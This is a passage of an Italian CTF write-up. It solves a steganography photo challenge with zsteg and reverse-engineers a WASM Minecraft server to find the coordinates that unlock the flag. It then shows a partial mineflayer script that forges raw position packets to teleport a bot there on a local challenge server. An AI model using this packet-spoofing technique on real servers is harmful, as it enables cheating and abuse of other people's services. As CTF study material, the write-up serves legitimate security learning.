<p>A parte un lungo racconto, la challenge chiedeva di trovare dove fosse stata scattata questa foto:</p>
<p><img alt="Allegato della challenge" loading="lazy" src="/images/idk_what_this_is.png"></p>
<p>Domanda strana per una misc, soprattutto perch√© la descrizione non forniva dati utili a trovare la posizione.</p>
<p>Abbiamo quindi trattato l‚Äôimmagine come una challenge di steganografia e l‚Äôabbiamo analizzata con <a href="https://www.aperisolve.com/"><code>aperisolve</code></a>.</p>
<p>Abbiamo trovato la flag nell‚Äôanalisi zsteg come <code>b1,rgb,lsb,xy</code>.</p>
<p><img alt="screenshot di aperisolve" loading="lazy" src="/images/aperisolve.png"></p>
<p>Con questo, abbiamo risolto la challenge e ottenuto la flag <code>CTF{Palazzo Falson}</code>.</p>
<h2 id="reverse-engineering-">Reverse engineering ‚öôÔ∏è<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-">#</a></h2>
<h3 id="minecrafty-as-a-service">Minecrafty as a Service<a hidden class="anchor" aria-hidden="true" href="#minecrafty-as-a-service">#</a></h3>
<h4 id="analisi-15">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-15">#</a></h4>
<p>L‚Äôallegato <code>main.wasm</code> √® un server Minecraft compilato in WebAssembly (WASM). Entrati nel server, si vedono due comandi disponibili: <code>!help</code> e <code>!flag</code>. Eseguendo <code>!flag</code>, il server risponde con qualcosa tipo: <code>Per ottenere la flag, esegui questo comando alla posizione UwU</code>. Questo implica che dobbiamo trovare l‚Äôesatta posizione alla quale eseguire <code>!flag</code>, come definita in <code>main.wasm</code>.</p>
<p>Per localizzare l‚Äôhandler del comando, ho cercato una funzione con <code>chat</code> nel nome. Ho trovato <code>github.com_go_mc_server_game.__globalChat_.Handle</code>, che all‚Äôindirizzo 0x808c1d77 contiene l‚Äôhandler per <code>!flag</code>. Analizzandolo, si vede che la posizione corrente del giocatore deve essere esattamente (35246, 35246, 35246) perch√© la flag venga stampata.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// After matching &#34;!flag&#34;
</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="nf">truncS</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">posX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">Y</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="nf">truncS</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">posY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">Z</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="nf">truncS</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">posZ</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 0x89ae == 35246
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">X</span> <span class="o">!=</span> <span class="mh">0x89ae</span><span class="p">)</span> <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">Y</span> <span class="o">!=</span> <span class="mh">0x89ae</span><span class="p">)</span> <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">Z</span> <span class="o">==</span> <span class="mh">0x89ae</span><span class="p">)</span> <span class="k">goto</span> <span class="n">success</span><span class="p">;</span>   <span class="c1">// all three must be 35246
</span></span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
</span></span></code></pre></div><h4 id="soluzione-12">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-12">#</a></h4>
<p>Sapendolo, dobbiamo spostarci alle coordinate (35246, 35246, 35246). Per farlo ho riutilizzato la soluzione della challenge Minecraft delle qualifiche, cambiando la posizione target.</p>
<h4 id="script-11">Script<a hidden class="anchor" aria-hidden="true" href="#script-11">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env node
</span></span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">mineflayer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mineflayer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">Vec3</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vec3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseArgs</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="mi">25565</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Flaggy&#39;</span><span class="p">,</span> <span class="nx">version</span><span class="o">:</span> <span class="s1">&#39;1.19.4&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--host&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--port&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--name&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--version&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">args</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="mi">35246</span><span class="p">,</span> <span class="mi">35246</span><span class="p">,</span> <span class="mi">35246</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">MAX_STEP</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">stepTowards</span> <span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">dst</span><span class="p">,</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dx</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">x</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dy</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dz</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">dx</span> <span class="o">*</span> <span class="nx">dx</span> <span class="o">+</span> <span class="nx">dy</span> <span class="o">*</span> <span class="nx">dy</span> <span class="o">+</span> <span class="nx">dz</span> <span class="o">*</span> <span class="nx">dz</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nx">cur</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">&lt;=</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">dst</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">maxStep</span> <span class="o">/</span> <span class="nx">dist</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">cur</span><span class="p">.</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">dx</span> <span class="o">*</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span> <span class="o">+</span> <span class="nx">dy</span> <span class="o">*</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">dz</span> <span class="o">*</span> <span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">version</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">parseArgs</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[INIT] Config:&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">version</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">createOpts</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">auth</span><span class="o">:</span> <span class="s1">&#39;offline&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">version</span> <span class="o">&amp;&amp;</span> <span class="nx">version</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">!==</span> <span class="s1">&#39;auto&#39;</span><span class="p">)</span> <span class="nx">createOpts</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="nx">version</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[INIT] Version: auto&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">bot</span> <span class="o">=</span> <span class="nx">mineflayer</span><span class="p">.</span><span class="nx">createBot</span><span class="p">(</span><span class="nx">createOpts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[STATE] Logged in, waiting for spawn...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;kicked&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[STATE] Kicked:&#39;</span><span class="p">,</span> <span class="nx">reason</span><span class="o">?</span><span class="p">.</span><span class="nx">toString</span><span class="o">?</span><span class="p">.()</span> <span class="o">||</span> <span class="nx">reason</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[STATE] Error:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[STATE] Disconnected&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">cm</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">cm</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[CHAT]&#39;</span><span class="p">,</span> <span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;ctf{&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bot</span><span class="p">.</span><span class="nx">end</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">movementStarted</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">movementState</span> <span class="o">=</span> <span class="kc">null</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">teleportReady</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">startMovement</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="nx">movementStarted</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">entity</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">clone</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[STATE] Starting movement (</span><span class="si">${</span><span class="nx">reason</span><span class="si">}</span><span class="sb">) at`</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">x</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">start</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span> <span class="o">&amp;&amp;</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span><span class="p">.</span><span class="nx">startFlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">creative</span><span class="p">.</span><span class="nx">startFlying</span><span class="p">();</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[ACTION] Start flying&#39;</span><span class="p">)</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">cur</span> <span class="o">=</span> <span class="nx">start</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">moving</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">stepCount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">interval</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">((</span><span class="nx">a</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">y</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">b</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Target:&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nx">z</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Initial distance:&#39;</span><span class="p">,</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;blocks&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">movementState</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">cur</span><span class="p">,</span> <span class="nx">moving</span><span class="p">,</span> <span class="nx">stepCount</span><span class="p">,</span> <span class="nx">interval</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">moving</span><span class="p">)</span> <span class="k">return</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">next</span> <span class="o">=</span> <span class="nx">stepTowards</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">,</span> <span class="nx">MAX_STEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">stepLen</span> <span class="o">=</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">remainBefore</span> <span class="o">=</span> <span class="nx">dist</span><span class="p">(</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">TARGET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span> <span class="o">=</span> <span class="nx">next</span>
</span></span><span class="line"><span class="cl">      <span class="nx">movementState</span><span class="p">.</span><span class="nx">stepCount</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[MOVE] step </span><span class="si">${</span><span class="nx">movementState</span><span class="p">.</span><span class="nx">stepCount</span><span class="si">}</span><span class="sb"> -&gt; (</span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">) `</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                  <span class="sb">`(step=</span><span class="si">${</span><span class="nx">stepLen</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb"> rem=</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">remainBefore</span> <span class="o">-</span> <span class="nx">stepLen</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="sb">)`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;position&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">,</span> <span class="nx">onGround</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;position_look&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">z</span><span class="o">:</span> <span class="nx">next</span><span class="p">.</span><span class="nx">z</span><span class="p">,</span> <span class="nx">yaw</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">pitch</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">onGround</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[NET] Move send failed:&#39;</span><span class="p">,</span> <span class="nx">e2</span><span class="o">?</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="nx">e2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">next</span><span class="p">.</span><span class="nx">equals</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">movementState</span><span class="p">.</span><span class="nx">moving</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[MOVE] Arrived at target. Requesting flag...&#39;</span><span class="p">)</span>
